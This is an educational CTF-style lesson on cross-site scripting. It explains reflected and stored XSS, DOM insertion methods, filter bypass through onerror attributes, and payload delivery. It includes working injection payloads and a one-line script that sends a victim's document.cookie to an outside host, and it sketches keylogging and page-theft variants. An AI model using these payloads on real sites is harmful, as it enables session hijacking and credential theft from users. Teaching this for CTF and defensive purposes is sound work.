# Lesson 9 - Cross Site Scripting (XSS)
Cross Site Scripting (XSS) is the practice of inserting malicious code into a website to steal credentials or do something the victim doesn't want. Some examples include stealing admin or session cookies, stealing usernames and passwords, clickjacking, redirecting traffic, etc.

## Steps for XSS
There are 3 main steps for Cross Site Scripting to work:

1. Find a reflection point
2. Be able to insert Javascript
3. Deliver a payload

## Reflection Point
A reflection point is a place on a website where user input is reflected. Some common examples are comments, bios, social media and blog posts, notes, messages, or even what you type into the search bar. There are two main types of XSS:

* Reflected XSS
* Stored/persistent XSS

### Reflected XSS
**Reflected XSS** is when the user input is temporary, and only present when specifically directed to by the attacker. Examples include GET parameters in the URL, inputs into forms, etc.

This is a login form. If incorrect credentials are supplied, the website may tell you "The username `<inserts username>` is incorrect", so whatever you supply to the form is put out.

<img src="xssReflectedLogin.jpg">

A more common example is through the URL or its parameters. For example, I typed `fdsa` into the search bar, and you can see my string reflected on the page. This is because it depends on the URL - so if I typed in the url `https://sos.tn.gov/site-search/malicious-input-here`, you'll see `malicious-input-here` on the page. 

<img src="xssReflectedURL.png" width="600px">

### Stored XSS
Reflected XSS is more difficult to do because you normally will have to trick a victim into clicking on a malicious link, through phishing emails or other ways. **Stored XSS** has a much higher success rate because if someone goes to a site with stored, malicious input of their own volition, they will receive the payload. For example, if you make a comment on a Facebook post, anyone that sees the Facebook post will see your input. While tricking a victim into going to that page will speed things up, it's not necessary. 

Stored XSS means your user input is stored in some sort of database or file and, whenever a person access that page, your input is retrieved and then displayed. For example, this is a simplistic pastebin site. If you create a public paste, anyone that visits it will then see your malicious input.

<img src="xssStoredPaste.png" width="800px">

## Insert Javascript
Once you have found a reflection point, you need to determine if you can inject Javascript into the page. This part is often very tricky, as there are various methods (effective and ineffective) of filtering Javascript. 

### Source Code
If you have access to all or some of the source code, you can see how the text is added to the page. Sometimes, it's server-side code like `<?php echo $someones_input; ?>`, and sometimes it'll use Javascript like `var text = getUserInput(); document.getElementById("reflection-point").innerHTML = text;`.

In JavaScript, there are 3 main ways of inserting text into a node - `.innerHTML`, `.innerText`, and `.textContent`. Any text inserted through Javascript with `innerHTML` means that if you insert tags `<>`, they will be processed as HTML. This means you can insert a `<script>` tag and whatever is inside will be executed. This is the easiest way. 

If the text is inserted with `textContent`, then it will only be parsed as a string and any tags will NOT turn into HTML. It's not possible to insert Javascript using `textContent`. `innerText` is very similar to `textContent`, the only difference is that if your user input is being put into a `<script>` tag with `innerText`, your JavaScript will be run. So not very likely, but sometimes all you need is a little window to be let in.

**Use the javascript.html file in this folder to see the difference between `textContent`, `innerText`, and `innerHTML`.**

*Note - you may notice that if you inject a `<script>` tag with Javascript inside, it won't run. This is because HTML 5 automatically does not run any Javascript in a `<script>` tag inserted AFTER the page has loaded. However, all is not lost! If you insert `<img src="fdsadfa" onerror="alert()">`, you can run Javascript through that.*

### What to insert?
The most obvious way to run Javascript is by inserting `<script> </script>` tags with your code in the middle. However, this only works if this is when the page loads and no filtering is taking place (see note above). [This is a website](http://34.94.3.143/ae7c14438c/) that I used to gain some flags for a CTF. When you create a new note, they automatically replace any instance of the word `script` with `scrubbed`. This means any `<script>` tags become `<scrubbed>` tags, and anything that says javascript becomes javascrubbed. 

One way to bypass this simple and ineffective filter is by using HTML attributes. Javascript can be included in attributes such as `onerror`, `onload`, etc. (any attribute on [this list](https://www.w3schools.com/tags/ref_attributes.asp) that starts with on accepts Javascript). 

For example, if I inserted `<img src="gafsdafsdf" onerror="alert('You can run JS here')">` into the page, the browser would realize that ./gafsdafsdf is not actually an image, and will run the javascript in the onerror attribute. This allows you to not use the word `script` anywhere, and insert Javascript into almost any HTML element type.

### Filtering
Most CTF challenges are difficult because they require you to 1) find a reflection point and 2) bypass some sort of filtering process. There are 1001 different ways to filter out malicious inputs, including:

* Replacing anything that says `script` with `scrubbed` (ineffective)
* Inserting text with `textContent` or `innerText` (effective)
* Using [DOMPurify](https://github.com/cure53/DOMPurify), an open-source library that filters out any XSS (effective)
* Removing any `<script>` tags (ineffective)
* Filtering out any single or double quotes (ineffective)

There is [a list on OWASP.org](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) that contains dozens of different ways to bypass various XSS filters.

## Payloads
Once you have found a location where you can insert Javascript, almost all the work is done. The last thing you need to do is craft a payload that will give you what you want. Most CTF competitions will have a bot with a cookie in their browser, and direct you to steal that cookie. 

Since someone else will be running the Javascript that you provide, you have to find a way to exfiltrate the data. Printing to the console or on the screen will only show up for them. You must have them interact with another website in order to capture the data. The payload that I most commonly use is below:

```
var myImage = new Image(100, 200); myImage.src = 'https://justinapplegate.me/my_flag?is='+escape(document.cookie);
```

This simple one line script initializes an image object and sets the source for the image to my website with the cookie at the end. It automatically sends out an HTTP requests to the source link. Since I can look at all requests made to my webserver (even if they don't exist), all I need to do is refer to those logs and I'll see someone requested `https://justinapplegate.me/my_flag?is=flag{the_flag_is_here}`, thereby giving me the flag. 

This requires that you have access to your own website. If you don't have your own site, there are other sites that you can use for this purpose, such as ?

In the case that you want to steal something else, such as credentials that someone types into a login form, or copy the contents of a webpage that only admins can visit, you can modify this payload so the text sent in the URL is what you want. For credential stealing, you could create a payload that sends a url with the current value of an input tag each time a key is pressed. For a separate webpage's content, you could create an HTTP request in Javascript that requests the page and includes the entire content in the URL.

### Deploying the Payload
You've found a reflection point, been able to insert Javascript, and you've crafted your own payload to steal cookies, credentials, etc. Now you need to find a way to get the victim to run the code. Whether it's stored or reflected XSS, you'll need your victim to access a specific webpage. In real life, this would normally be through a phishing attempt or by exploiting an XSS vulnerability on another site to redirect them. In CTFs, they typically have an admin bot that will visit whatever link you submit to it, thereby making your payload deployment very easy. 


### Practice 
[XSS Game](http://xss-game.appspot.com/)
